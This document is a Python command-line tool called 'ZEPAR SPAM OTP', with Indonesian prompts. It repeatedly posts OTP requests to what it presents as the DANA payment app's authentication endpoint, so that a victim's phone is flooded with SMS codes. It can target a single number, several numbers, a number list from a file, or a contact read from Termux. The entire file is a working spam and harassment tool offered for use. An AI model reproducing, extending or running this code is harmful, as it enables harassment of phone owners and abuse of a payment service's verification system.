#!/usr/bin/python
import requests,random,json,time,sys,os,re

# -----------------------------------------------------------
# Nama Tool: ZEPAR SPAM OTP
# Creator: Zepar
# Feature: DANA OTP Spam Only (FIXED ENDPOINT)
# ---------------------------------------------------------------

p = '\x1b[0m'
m = '\x1b[91m'
h = '\x1b[92m'
k = '\x1b[93m'
b = '\x1b[94m'
u = '\x1b[95m'
bm = '\x1b[96m'

class ZeparSpam:
    def __init__(self, nomer):
        self.nomer = nomer
        
    def dana_spam(self):
        nomor_bersih = self.nomer
        if nomor_bersih.startswith('+62'):
            nomor_bersih = nomor_bersih[3:]
        elif nomor_bersih.startswith('0'):
            nomor_bersih = nomor_bersih[1:]
        
        # Endpoint DANA yang valid
        url = "https://api.dana.id/backend/api/v1/auth/requestOtp"
        
        headers = {
            'User-Agent': random.choice(open('ua.txt').readlines()).split('\n')[0],
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'x-platform': 'android',
            'x-version': '2.5.0'
        }
        
        payload = {
            "mobileNumber": nomor_bersih,
            "countryCode": "62",
            "type": "SMS"
        }
        
        try:
            req = requests.post(url, headers=headers, json=payload, timeout=30)
            
            if req.status_code == 200:
                resp = req.json()
                if resp.get('success') or resp.get('status') == 'success':
                    return f'\x1b[92m[SUCCESS] DANA Spam -> {self.nomer} OTP Terkirim'
                elif 'limit' in str(resp).lower():
                    return f'\x1b[91m[FAIL] DANA Spam -> {self.nomer} Limit 3x hari ini'
                else:
                    return f'\x1b[91m[FAIL] DANA Spam -> {self.nomer} Response: {resp.get("message", "Unknown")}'
            elif req.status_code == 429:
                return f'\x1b[91m[FAIL] DANA Spam -> {self.nomer} Too Many Requests'
            else:
                return f'\x1b[91m[FAIL] DANA Spam -> {self.nomer} HTTP {req.status_code}'
                
        except requests.exceptions.Timeout:
            return f'\x1b[91m[FAIL] DANA Spam -> {self.nomer} Timeout'
        except requests.exceptions.ConnectionError:
            return f'\x1b[91m[FAIL] DANA Spam -> {self.nomer} Connection Error'
        except Exception as e:
            return f'\x1b[91m[FAIL] DANA Spam -> {self.nomer} Error: {str(e)[:50]}'

def apakah():
    while True:
        lan = str(input(k + '\tIngin lanjut? y/n : ' + h))
        if lan.lower() == 'y':
            menu_utama()
        elif lan.lower() == 'n':
            print(p + '\n\tTerima kasih telah menggunakan Zepar DANA Spam')
            break
        else:
            continue

def single():
    nomer = str(input(k + '\tNomor target (81234567890) : ' + h))
    jm = int(input(k + '\tJumlah spam : ' + h))
    dly = int(input(k + '\tJeda (detik) : ' + h))
    print('\n')
    for oo in range(jm):
        z = ZeparSpam(nomer)
        print('\t' + z.dana_spam())
        time.sleep(dly)
    apakah()

def multi():
    daftar_nomer = []
    jum = int(input(k + '\tJumlah nomor : ' + h))
    for i in range(jum):
        daftar_nomer.append(str(input(k + f'\tNomor ke-{i+1} : ' + h)))
    spm = int(input(k + '\tJumlah spam per nomor : ' + h))
    dly = int(input(k + '\tJeda (detik) : ' + h))
    print('\n')
    for i in range(spm):
        for nomor in daftar_nomer:
            z = ZeparSpam(nomor)
            print('\t' + z.dana_spam())
        time.sleep(dly)
    apakah()

def dari_file():
    fil = str(input(k + '\tNama file : ' + h))
    if fil in os.listdir(os.getcwd()):
        nomor_list = open(fil, 'r').readlines()
        js = int(input(k + '\tJumlah spam per nomor : ' + h))
        dly = int(input(k + '\tJeda (detik) : ' + h))
        print('\n')
        for _ in range(js):
            for line in nomor_list:
                nomor = line.strip()
                if nomor:
                    z = ZeparSpam(nomor)
                    print('\t' + z.dana_spam())
            time.sleep(dly)
        apakah()
    else:
        print(m + f'\tFile {fil} tidak ditemukan')

def dari_kontak():
    os.system('termux-contact-list > .zepar_contact')
    kontak = json.loads(open('.zepar_contact', 'r').read())
    for idx, org in enumerate(kontak):
        print(m + str(idx+1) + ' ' + k + org['name'])
    pilih = int(input(u + '\tPilih nomor > ' + h)) - 1
    target = kontak[pilih]['number']
    target = re.sub(r'[^0-9]', '', target)
    if target.startswith('62'):
        target = target[2:]
    dly = int(input(u + '\tJeda (detik) > ' + h))
    jumlah = int(input(u + '\tJumlah spam : ' + h))
    print('\n')
    for _ in range(jumlah):
        z = ZeparSpam(target)
        print('\t' + z.dana_spam())
        time.sleep(dly)
    apakah()

def banner():
    os.system('clear')
    print('''
\x1b[94m
╔═══════════════════════════════════════╗
║                                       ║
║   ███████╗███████╗██████╗  █████╗ ██████╗
║   ╚══███╔╝██╔════╝██╔══██╗██╔══██╗██╔══██╗
║     ███╔╝ █████╗  ██████╔╝███████║██████╔╝
║    ███╔╝  ██╔══╝  ██╔═══╝ ██╔══██║██╔══██╗
║    ███████╗███████╗██║     ██║  ██║██║  ██║
║    ╚══════╝╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝
║                                       ║
║         SPAM OTP - DANA               ║
║            Creator: Zepar             ║
╚═══════════════════════════════════════╝
\x1b[0m''')

def menu_utama():
    banner()
    print(b + '╔════════════════════════════════╗')
    print(b + '║' + h + '          ZEPAR DANA SPAM         ' + b + '║')
    print(b + '╠════════════════════════════════╣')
    print(b + '║' + m + '  [1] ' + bm + 'Single Target            ' + b + '║')
    print(b + '║' + m + '  [2] ' + bm + 'Multi Target             ' + b + '║')
    print(b + '║' + m + '  [3] ' + bm + 'Dari File                ' + b + '║')
    print(b + '║' + m + '  [4] ' + bm + 'Dari Kontak (Termux)     ' + b + '║')
    print(b + '║' + m + '  [0] ' + bm + 'Keluar                   ' + b + '║')
    print(b + '╚════════════════════════════════╝')
    
    pilih = str(input(b + '╚═► ' + u + 'Pilih' + m + ' : ' + h))
    
    if pilih == '1':
        single()
    elif pilih == '2':
        multi()
    elif pilih == '3':
        dari_file()
    elif pilih == '4':
        dari_kontak()
    elif pilih == '0':
        sys.exit()
    else:
        print(m + '             Pilihan salah')
        time.sleep(1)
        menu_utama()

if __name__ == '__main__':
    menu_utama()
